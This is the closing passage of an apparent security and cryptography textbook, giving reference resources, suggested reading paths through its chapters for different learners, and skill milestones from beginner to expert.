- **MITRE ATT&CK**: attack.mitre.org
- **CIS Benchmarks**: cisecurity.org
- **NSA/CISA Advisories**: cisa.gov

---

## Final Notes: Your Learning Roadmap

Here is a suggested path through this book depending on your starting point:

### Path 1: Complete Beginner
Chapter 1 → 2 → 3 → 4 → 18 → 19 → 20 → 21 → 22 → 5 → 6 → 7 → 13 → 15 → 24 → 29 → 30

### Path 2: Developer Wanting Cryptography
Chapter 1 → 2 → 5 → 6 → 7 → 8 → 9 → 10 → 11 → 12 → 13 → 14 → 15 → 16 → 35

### Path 3: Network Engineer Wanting Security
Chapter 1 → 18 → 19 → 20 → 21 → 22 → 23 → 24 → 25 → 26 → 27 → 28 → 30

### Path 4: Security Researcher / Expert
Chapter 31 → 32 → 33 → 17 → 34 → then fill in any gaps

### Skills Milestones

**Beginner:** Can explain CIA triad, knows why MD5 is broken, understands how TLS works at a conceptual level, can configure a firewall.

**Intermediate:** Can implement AES-GCM encryption correctly in code, understands RSA and ECC key exchange, can perform basic web application pentesting, understands PKI and certificate validation, can analyze network captures.

**Advanced:** Can analyze cipher security, implement custom protocol correctly using primitives, conduct full penetration tests, design security architectures, understand lattice-based PQC, analyze malware.

**Expert:** Contributes to cryptographic standards, discovers new attack classes, implements cryptographic algorithms from specification with side-channel resistance.

---

*This book covers the state of knowledge as of 2024. Cryptography and security evolve rapidly — always check current standards (NIST, IETF) and stay subscribed to security advisories (CISA, vendor bulletins) to keep your knowledge current.*

---
**End of Book**
---